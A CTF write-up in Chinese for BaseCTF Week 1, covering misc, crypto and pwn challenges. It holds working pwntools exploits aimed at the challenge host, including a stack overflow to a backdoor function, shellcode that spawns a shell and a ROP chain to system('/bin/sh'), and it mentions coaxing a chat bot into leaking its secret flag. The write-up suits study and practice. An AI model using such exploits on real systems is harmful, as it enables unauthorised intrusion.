---
title: BaseCTF Week 1 WP
createTime: 2025/04/30 19:15:13
permalink: /cybersecurity/hoxqnver/
---
**队伍：Aura&Jumping**

## Misc
### 倒计时？海报
一共十张海报，每张里面都藏了 flag 的一部分，放大仔细看能看清一点点，如果对图片进行一些处理会更清楚一些。

![](../../../../images/326453d8e76a11270ab6799bc459d8cc.png)

```plain
BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}

```



### 根本进不去啊！
:::warning
悄悄告诉你: flag 在 flag.basectf.fun

进不去！怎么想都进不去吧？

:::

使用在线网站 [在线域名解析记录检测-在线Nslookup域名解析查询工具 (jsons.cn)](http://www.jsons.cn/nslookup/)

![](../../../../images/294063659f730ae9f10c9260d180f759.png)

```plain
<font style="color:rgb(51, 51, 51);">BaseCTF{h0h0_th1s_15_dns_rec0rd}</font>

```



### 海上遇到了鲨鱼
流量分析，用 WireShark 打开流量包。

![](../../../../images/71f39c4bcccf3ae6c2df464c6a5efcdc.png)

随便翻翻，找到一个翻转的 flag，直接用 python 给他翻回来。

```python
flag = "}67bf613763ca-50b3-4437-7a3a-b683fe51{FTCesaB"[::-1]
print(flag)
#BaseCTF{15ef386b-a3a7-7344-3b05-ac367316fb76}
```

```plain
BaseCTF{15ef386b-a3a7-7344-3b05-ac367316fb76}

```



### 正着看还是反着看呢？
无后缀名，用 WinHex 打开看看，在末尾处发现 E0 FF D8 FF，再结合题目名字，这就是一个文件翻转，并且翻转后是 .jpg 文件。

```python
with open("flag", 'rb') as f:
    with open("output.jpg", 'wb') as g:
        g.write(f.read()[::-1])
```

![](../../../../images/f76573808567fee425c0398b5f8ed3ae.jpeg)

图片里面有其他东西，使用 binwalk 分离以后，发现里面的 flag.txt。

```plain
BaseCTF{h3ll0_h4cker}

```



### Base
:::warning
KFWUM6S2KVHFKUTOOQZVUVCGNJGUOMLMLAZVE5SYGJETAYZSKZVGIR22HE======

:::

直接丢入 CyberChef。

![](../../../../images/7b982c5f15ac5b63776f279849c3667a.png)

Base 64 又套了一个 Base 32。

```plain
BaseCTF{we1c0me_to_b4sectf}

```



### 签到！DK 盾！
:::warning
BaseCTF 由 DK 盾独家赞助

关注 DK 盾公众号，发送 `BaseCTF2024`，即可获得 Flag

DK 盾，打造高性价比云服务器，让广大CTFer、学生群体早日上云

:::

听话照做即可。

```plain
BaseCTF{2024_sp0n5ored_by_dkdun}

```



### 你也喜欢圣物吗
![](../../../../images/d3610398131c41a83033e2ea635c1ff8.png)

一个 .png，一个需要密码的压缩包。

先看看图片有什么东西，丢入 StegSolve，发现是 LSB 隐写，调成如下配置以后能够看见压缩包密码。

![](../../../../images/0e107ce53c174629bcbbe0b9eb18d197.png)

```plain
lud1_lud1

```

解压后，发现还有一个压缩包。

![](../../../../images/635c3808179a5acc1320ed26119076a3.png)

不过这是一个伪加密，用 010 Editor 把 frFlags 和 deFlags 都改成 0 即可，然后解压。

![](../../../../images/421c4735d61fc7299fbf0ef6d9040101.png)

![](../../../../images/ef376bdb943c2b63091a7fd32afadf41.png)

里面是一个 txt 文档，Ctrl + A 全选丢入 CyberChef。

:::danger
文本最后还有东西！

:::

![](../../../../images/de4fe4100a7d3507be1d2831c6f40f34.png)

发现前面是假 flag，后面还有一串密文，继续解密。

![](../../../../images/6c391bd762fa164626e9a9badffeaecf.png)

得到 flag。

```plain
BaseCTF{1u0_q1_x1_51k1}

```



### 捂住X只耳
音频隐写，但是不是很常规的隐写。

题面提示要屏蔽立体声，那么就先拆分左右声道。

丢入 Audacity，选择轨道->分离立体声到单声道。

左右声道可能有一些差异，通过波的叠加来提取左右声道差异。

![](../../../../images/110afe625c92c1fc96cf00a855bb92db.png)

选中左声道，在效果中选择反相（上下）。

![](../../../../images/935f2ee2bf55de3d0a9c8e6b611627aa.png)

然后 Ctrl + A 全选轨道，在轨道中选择混音->混音并渲染到新轨道。

![](../../../../images/a791a5b5f0115b68df602215f14f70ee.png)

发现摩斯密码，手动提出来解一下即可。

```plain
..-. --- .-.. .-.. --- .-- -.-- --- ..- .-. .... . .- .-. -

```

```plain
FOLLOWYOURHEART

```

```plain
BaseCTF{FOLLOWYOURHEART}

```



### 人生苦短，我用 Python
```python
import base64
import hashlib

def abort(id):
    print('You failed test %d. Try again!' % id)
    exit(1)

print('Hello, Python!')
flag = input('Enter your flag: ')

if len(flag) != 38:
    abort(1)

if not flag.startswith('BaseCTF{'):
    abort(2)

if flag.find('Mp') != 10:
    abort(3)

if flag[-3:] * 8 != '3x}3x}3x}3x}3x}3x}3x}3x}':
    abort(4)

if ord(flag[-1]) != 125:
    abort(5)

if flag.count('_') // 2 != 2:
    abort(6)

if list(map(len, flag.split('_'))) != [14, 2, 6, 4, 8]:
    abort(7)

if flag[12:32:4] != 'lsT_n':
    abort(8)

if '😺'.join([c.upper() for c in flag[:9]]) != 'B😺A😺S😺E😺C😺T😺F😺{😺S':
    abort(9)

if not flag[-11].isnumeric() or int(flag[-11]) ** 5 != 1024:
    abort(10)

if base64.b64encode(flag[-7:-3].encode()) != b'MG1QbA==':
    abort(11)

if flag[::-7].encode().hex() != '7d4372733173':
    abort(12)

if set(flag[12::11]) != {'l', 'r'}:
    abort(13)

if flag[21:27].encode() != bytes([116, 51, 114, 95, 84, 104]):
    abort(14)

if sum(ord(c) * 2024_08_15 ** idx for idx, c in enumerate(flag[17:20])) != 41378751114180610:
    abort(15)

if not all([flag[0].isalpha(), flag[8].islower(), flag[13].isdigit()]):
    abort(16)

if '{whats} {up}'.format(whats=flag[13], up=flag[15]).replace('3', 'bro') != 'bro 1':
    abort(17)

if hashlib.sha1(flag.encode()).hexdigest() != 'e40075055f34f88993f47efb3429bd0e44a7f479':
    abort(18)

print('🎉 You are right!')
import this

```

猜谜题目，一直逐个条件试就完了，到最后可以猜一下单词是什么，能更快得得到 flag。

```plain
BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}

```



### 喵喵太可爱了
:::warning
 喵喵太可爱啦，在群里 @喵喵机器人 就可以和喵喵聊天啦~ 可是笨喵喵似乎藏着什么秘密？  

:::

需要让机器人说出 flag，非常非常非常非常非常难。

这里给出一种 20% 的概率能让机器人说出 flag 的发言。

![](../../../../images/9458c52ea120460a31bf66ef4031f45d.png)

```plain
BaseCTF{m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag}

```



## Crypto
### helloCrypto
```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random

flag=b'BaseCTF{}'

key=random.randbytes(16)
print(bytes_to_long(key))

my_aes=AES.new(key=key,mode=AES.MODE_ECB)
print(my_aes.encrypt(pad(flag,AES.block_size)))

# key1 = 208797759953288399620324890930572736628
# c = b'U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae'
```

AES加密，倒着写回去即可。

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
key = 208797759953288399620324890930572736628
key = long_to_bytes(key)
flag = b'U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae'
my_aes=AES.new(key=key,mode=AES.MODE_ECB)
print(my_aes.decrypt(pad(flag,AES.block_size)))
#b'BaseCTF{b80bf679-1869-4fde-b3f9-d51b872d31fb}\x03\x03\x03\xcd\xc6\xd1d\xb2\xe8\xe6\xca\x12sJ\xaf\xa7<\x9f\xd0'
```

```plain
BaseCTF{b80bf679-1869-4fde-b3f9-d51b872d31fb}

```



### 你会算 md5 吗
```python
import hashlib

flag='BaseCTF{}'

output=[]
for i in flag:
    my_md5=hashlib.md5()
    my_md5.update(i.encode())
    output.append(my_md5.hexdigest())
print("output =",output)
'''
output = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf']
'''
```

flag 中的每个字符都进行了 md5 加密，那么只需要逐个爆破每个字符，与目标 md5 值比较即可。

```python
import hashlib
output = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf']
flag = ""
for i in output:
    for c in range(1,127):
        c = chr(c)
        my_md5 = hashlib.md5()
        my_md5.update(c.encode())
        if(my_md5.hexdigest()==i):
            flag += c
print(flag)
#BaseCTF{a4bf43a5-3ff9-4764-bda2-af8ee4db9a8a}
```

```plain
BaseCTF{a4bf43a5-3ff9-4764-bda2-af8ee4db9a8a}

```



### ez_rsa
```python
from Crypto.Util.number import *
import gmpy2
m=bytes_to_long(b'BaseCTF{th1s_is_fake_fl4g}')
e=65537
p=getPrime(512)
q=getPrime(512)
n=p*q
not_phi=(p+2)*(q+2)
c=pow(m,e,n)

print(n)
print(not_phi)
print(c)


'''
96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421
96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205
37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945
'''

```

因为![image](../../../../images/81b53e9b0fa818b9a2a0e2d399b5251b.svg)

又因为![image](../../../../images/07e681978a5f297fb29e747dd2465730.svg)

所以![image](../../../../images/9302ddbe4bde95dcbcb991dde3245049.svg)

```python
import libnum
e=65537
n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421
not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205
c = 37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945
phi = n-(not_phi-n-4)//2+1
d = libnum.invmod(e,phi)
m = pow(c,d,n)
print(libnum.n2s(m))
#BaseCTF{it_1s_ez!!}
```

```plain
BaseCTF{it_1s_ez!!}

```



### 十七倍
```c
#include <stdio.h>

int main() {
    unsigned char flag[] = "BaseCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
    
    /**
     * �� (unsigned) char ������ÿ��Ԫ�����ڴ���ռ 1 �ֽڣ��� 8 λ��8 �� 0 �� 1��
     * ���ڴ��У����ַ�������������ڡ���ĸ�������ǵڼ����ַ�
     * ���磺
     * B ��  66 ���ڴ��д���� 01000010
     * a ��  97 ���ڴ��д���� 01100001
     * s �� 115 ���ڴ��д���� 01110011
     * e �� 101 ���ڴ��д���� 01100101
     */

    int i;
    for (i = 0; i < 40; i++) {
        flag[i] = flag[i] * 17;
    }
    if (flag[0] != 98) {  /* �±��Ǵ� 0 ��ʼ�� */
        printf("CPU Error???\n");
        return 1;
    }

    /**
     * 66 * 17 = 1122
     * ������ڴ��б��� 1122������ 00000100 01100010
     * ���� unsigned char ������ֻ�ܴ� 8 λ��CPU Ӳ�����Զ�ȡ�� 8 λ���� 01100010
     * 01100010 �� 98������ 66 * 17 = 98
     * 
     * ע�⵽ 8 �� 0 �� 1 �� 256 �ֿ��ܣ��� 0~255
     * ��ȡ�� 8 λ��ȡģ��ȡ������256
     * �������֤��1122 ���� 256 ��Ϊ 4 ����Ϊ 98
     */

    unsigned char cipher[] = {
         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,
        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,
         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,
        180, 113, 146, 148, 163,  79,  78,  48, 231,  77
    };
    for (i = 0; i < 40; i++) {
        if (flag[i] != cipher[i]) {
            printf("flag[%d] is wrong, expect %d, got %d.\n", i, cipher[i], flag[i]);
            return 1;
        }
    }

    /**
     * ��� flag ����ȷ�ģ�������õ���������ݡ�
     * �����ʵ�������㣬flag[i] * 17 = cipher[i]����ô flag[i] = cipher[i] / 17
     * ģ�� 256 ��������ô���أ�ѧһ�¡�ģ����˷���Ԫ���ɡ�
     */

    return 0;
}

```

每个字符乘了个17，我这里直接逐位爆破。

```cpp
#include<bits/stdc++.h>
using namespace std;
int main()
{
    unsigned char cipher[] = {
         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,
        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,
         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,
        180, 113, 146, 148, 163,  79,  78,  48, 231,  77
    };
    for(int i=0;i<40;i++)
    {
        for(int c=0;c<127;c++)
        {
            unsigned char temp=c*17;
            if(temp==cipher[i])
            {
                printf("%c",c);
                break;
            }
        }
    }
    return 0;
}
//BaseCTF{yoUr_CrYpt0_1earNinG_5tarTs_n0w}
```

```plain
BaseCTF{yoUr_CrYpt0_1earNinG_5tarTs_n0w}

```



### babypack
```python
from Crypto.Util.number import *
import random
flag=b'BaseCTF{}'
m=bytes_to_long(flag)
bin_m=bin(m)[2:]
length=len(bin_m)

a=[1]
sum=1
for i in range(length-1):
    temp=random.randint(2*sum+1,4*sum)
    sum=sum+temp
    a.append(temp)

a=a[::-1]
c=0
for i in range(length):
    if bin_m[i]=='1':
        c=c+a[i]
print("a=",a)
print("c=",c)
```

队友喂给 GPT 直接给跑出来了，要到代码以后想了想，其实就是一个贪心，从 a 中最大的开始，如果与当前累加和相加不超过 c，那么这一位就是 1，反之为 0。

```python
from Crypto.Util.number import long_to_bytes
a= [2487264674516612702148381262059366937897201508455413114345031288894980789076145147579418259432661232747375904997965581530362268904008339124626472045717075482791021095030019783589425299870946373246221582957232862473515,...3, 1]
c= 2488656295807929935404316556194747314175977860755594014838879551525915558042003735363919054632036359039039831854134957725034750353847782168033537523854288427613513938991943920607437000388885418821419115067060003426834
recovered_bin = ''
current_sum = 0
for value in a:
    if current_sum + value <= c:
        recovered_bin += '1'
        current_sum += value
    else:
        recovered_bin += '0'
recovered_m = int(recovered_bin, 2)
recovered_flag = long_to_bytes(recovered_m)
print("Recovered Flag:", recovered_flag)
#b'BaseCTF{2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9}'
```

```plain
BaseCTF{2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9}

```



### babyrsa
```python
from Crypto.Util.number import *

flag=b'BaseCTF{}'
m=bytes_to_long(flag)

n=getPrime(1024)
e=65537
c=pow(m,e,n)

print("n =",n)
print("e =",e)
print("c =",c)
"""
n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323
e = 65537
c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832
"""
```

n 就是素数，那么 n 的欧拉函数就是 n-1。

```python
import libnum
n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323
e = 65537
c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832
phi = n-1
d = libnum.invmod(e,phi)
m = pow(c,d,n)
print(libnum.n2s(m))
#BaseCTF{7d7c90ae-1127-4170-9e0d-d796efcd305b}
```

```plain
BaseCTF{7d7c90ae-1127-4170-9e0d-d796efcd305b}

```



### ez_math
```python
import numpy as np
from Crypto.Util.number import *

a, b, c, d = [getPrime(128) for _ in range(4)]
point1 = a * d
point2 = b * c
matrix2 = [[0, a, b], [0, c, d]]

flag = b"flag{test_flag}"
flag = bytes_to_long(flag)


def randomArray():
    upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    for i in range(3):
        for j in range(i+1, 3):
            upper[i][j] = getPrime(128)
            low[j][i] = getPrime(128)
    result = np.array(upper) @ np.array(low)
    return result

A = np.array([[flag, 0, 0]] + matrix2)
B = randomArray()
MAT = A @ B

print(point1)
print(point2)
print(MAT)

'''
85763755029292607594055805804755756282473763031524911851356658672180185707477
70470862191594893036733540494554536608294230603070251013536189798304544579643
[[73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245
  46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830
  161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185]
 [13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909
  17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523
  59510107422473463833740668736202898422777415868238817665123293560097821015330]
 [11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729
  13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659
  48528427402189936709203219516777784993195743269405968907408051071264464132448]]
'''


```

![image](../../../../images/0972a0e9d309467f30d8b776c44aaf39.svg) 为素数，我们假设他为 ![image](../../../../images/283ef708f8357d5a485e425960066b3c.svg)，根据矩阵乘法的规则，可以得知 ![image](../../../../images/2d0154e762ac418da02084cbd931d644.svg) 就是![image](../../../../images/64907fcc2275a0e90c87aa22289806ff.svg) 乘上这个素数，即 ![image](../../../../images/5c40c2038dd121a779ea168660183c28.svg)。

直接把 ![image](../../../../images/a06dbd3d0d22a9965204328e68ea4bdc.svg)丢给 yafu 把素数拆出来，把 ![image](../../../../images/283ef708f8357d5a485e425960066b3c.svg)除掉就是 ![image](../../../../images/d71eed42a92e0f1ccc3d42fae0da1b8e.svg)。

```python
import libnum
r1 = 5
r2 = 47
r3 = 165910487036337353
r4 = 2030077153967
r5 = 15843025159117910236953662147
r6 = 264640112777955589596964625962416083749
r7 = 485632484872444690113355773590051952254669552507
flag = r1*r2*r3*r4*r5*r7
print(libnum.n2s(flag))
#b'BaseCTF{7E9328AF-784C-8AF5-AC10-D6A8FC0977A8}'
```

```plain
BaseCTF{7E9328AF-784C-8AF5-AC10-D6A8FC0977A8}

```

### mid_math
```python
import numpy as np
from Crypto.Util.number import *

a, b, c, d = [getPrime(128) for _ in range(4)]
point1 = a * d
point2 = b * c
matrix2 = [[0, a, b], [0, c, d]]

flag = b"flag{test_flag}"
flag = bytes_to_long(flag)

def randomArray():
    upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]]
    for i in range(3):
        for j in range(i+1, 3):
            upper[i][j] = getPrime(128)
            low[j][i] = getPrime(128)
    result = np.array(upper) @ np.array(low)
    return result

A = np.array([[flag, 0, 0]] + matrix2)
B = randomArray()
C = randomArray()
MAT = C @ A @ B


print(point1)
print(point2)
print(MAT)

'''
65540596822333029826884315503808996273733737079814345540607878287618419734231
45151244176940366132774311848077675849486332018843894072137609985463616792271
[[9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358
  3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247
  20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193]
 [3802535350808074374431476757195874789213113083310705049856269457737583463559458126494122484246497049005001474007088865512110432486291568737501434666990689483191924384489484665070592656641925905986397402822195880143437724155134584374613878027218950975919679551229
  1519642544380087919293814751485424198320747098741960781639133554268321708273309194651985562222274023623071346914239982055028526526058064787882720065775210796950963778381575914964024929110539407721461321785325399699126116201001806816030960662346173275101476487421
  8538097185709421082644083672229287227818939415260987123718318427750267353075860559170390896769087600458156859498331152566368881938040799840806164389020986990994328370205184734637870147251004626759120887684269603636183629300]
 [17987668490992083132878642797176089621188858356259455169173987325310681186627844776077058221612169421636403546746899152917309634315569997105261046388995579843528014810244648968375990949478033964619008761814039733347955609163
  7188579142941521685422767412932555782658469950638690886255638896617687421517941457682493542615460990114218059246938237257830976937359020731335958068934235967457123039874441635435388736524907036941379695243043923900290273902
  40388963560266769813551191613694768219344365780650048155838802242681775019274045964917142477325170274191702615504062392461666558731638338001971723737440974198823443420018559746335727687]]
'''


```

在上一题的基础上多乘了一个 C 矩阵，把上一题那种做法卡掉了。

不妨换一种思路，MAT 的行列式其实就是 A 的行列式，因为 B 和 C 的行列式都是 1。

A 的行列式就是 ![image](../../../../images/394a571068a43508293162df1c907d11.svg)。

```python
import sympy as sp
from Crypto.Util.number import *
ad = 65540596822333029826884315503808996273733737079814345540607878287618419734231
bc = 45151244176940366132774311848077675849486332018843894072137609985463616792271
A = sp.Matrix([[9259505595451159514948336330303511539525155092949382077995385373332083424570340733825203563332256599256361679775371565817159463557158551820090084800254999338417057682355404780422980119717238594927467956675771042145306399815569005775907169857728757334979422594358,3700462282298785820527479428312072678870010244861115107206951164684911761755437333209293039456840068340334559453608012512177623936248784897843503284633804083281388001236742261832974291349480314135560368365574114042082002559069958228523318326290833422846224288247,20791012146351643571145217310876690226642338279942557085580439219377325884045305279931904540467264182713135410067252835618936836675270813727053937054168296298149405902638242278868020381541490973458957704137657413376043351193],[3802535350808074374431476757195874789213113083310705049856269457737583463559458126494122484246497049005001474007088865512110432486291568737501434666990689483191924384489484665070592656641925905986397402822195880143437724155134584374613878027218950975919679551229,1519642544380087919293814751485424198320747098741960781639133554268321708273309194651985562222274023623071346914239982055028526526058064787882720065775210796950963778381575914964024929110539407721461321785325399699126116201001806816030960662346173275101476487421,8538097185709421082644083672229287227818939415260987123718318427750267353075860559170390896769087600458156859498331152566368881938040799840806164389020986990994328370205184734637870147251004626759120887684269603636183629300],[17987668490992083132878642797176089621188858356259455169173987325310681186627844776077058221612169421636403546746899152917309634315569997105261046388995579843528014810244648968375990949478033964619008761814039733347955609163,7188579142941521685422767412932555782658469950638690886255638896617687421517941457682493542615460990114218059246938237257830976937359020731335958068934235967457123039874441635435388736524907036941379695243043923900290273902,40388963560266769813551191613694768219344365780650048155838802242681775019274045964917142477325170274191702615504062392461666558731638338001971723737440974198823443420018559746335727687]])
det = A.det()
m = int(det)//(ad-bc)
print(long_to_bytes(m))
#b'BaseCTF{E439646E-1768-18B3-DC4B-483C40C5340C}'
```

```plain
BaseCTF{E439646E-1768-18B3-DC4B-483C40C5340C}

```







## Pwn
### 签个到吧
nc 即可 getshell。

![](../../../../images/d6ea5c5cab4e11726c1537904e57a5db.png)

```plain
BaseCTF{3c8c805c-512b-4141-948b-315532ff19d5}

```



### echo
SRCTF 的原题，只能使用 echo。

```plain
echo `<flag`

```

![](../../../../images/e73c890ecc3941c431e35770ebe2e625.png)

```plain
BaseCTF{abf95dc3-bc41-4a2e-ac17-b005a3623dfa}

```



### Ret2text
64位。

![](../../../../images/ca076e4ecaef484fcff344e9b70418f8.png)

存在栈溢出。

![](../../../../images/a9941c34fd1c469b47de1aa801f45219.png)

有后门函数，鉴定为基础模板，注意这是 64 位的，需要处理堆栈平衡。

```python
from pwn import*
host = remote("challenge.basectf.fun",22354)
cnt = 32
ex = 0x4011D1
addr = 0x4011A4
payload = b'A'*cnt + b'B'*8 + p64(ex) + p64(addr)
host.sendline(payload)
host.interactive()
```

![](../../../../images/444a0f7922e626625231400fbecfb4d1.png)

```plain
BaseCTF{bb1fe678-adc8-41cc-b510-bd501e6defbc}

```



### shellcode_level0
64位。

![](../../../../images/8d4fa550abf4d84954fd7620965f7454.png)

直接 shellcraft 一把梭。

```python
from pwn import *
context.arch = "amd64"
host = remote("challenge.basectf.fun",37446)
payload=asm(shellcraft.sh())
host.sendline(payload)
host.interactive()
```

![](../../../../images/286781aee54e1489762dae2c731e059e.png)

```plain
BaseCTF{75cb5065-f358-41a4-b229-c36b2c40d059}

```



### 我把她丢了
64位。

![](../../../../images/b59e6f1b4299c537617bb0075968042c.png)

存在栈溢出。

![](../../../../images/8812999cf443c1f2770da651e408b2bb.png)

有 system。

![](../../../../images/4a8bc6588662e8a080bffc7ef81ecfd6.png)

有 /bin/sh，鉴定为模板题。

```python
from pwn import*
host = remote("challenge.basectf.fun",28782)
sh = 0x402008
sys = 0x401080
rdi = 0x401196
ret = 0x40101a
payload = b'A'*112 + b'B'*8 + p64(rdi) + p64(sh) + p64(ret) + p64(sys)
host.sendline(payload)
host.interactive()
```

![](../../../../images/05b4c6b2860b489d3350b8e433e74a59.png)

```plain
BaseCTF{5f3242e5-ca0d-4c88-8dd5-ceb33af82656}

```



### 彻底失去她
队友秒的，裸栈溢出，没找到 /bin/sh，直接打 ret2libc。

```python
from pwn import *
p = remote('challenge.basectf.fun', 39924)
elf = ELF('./pwn')
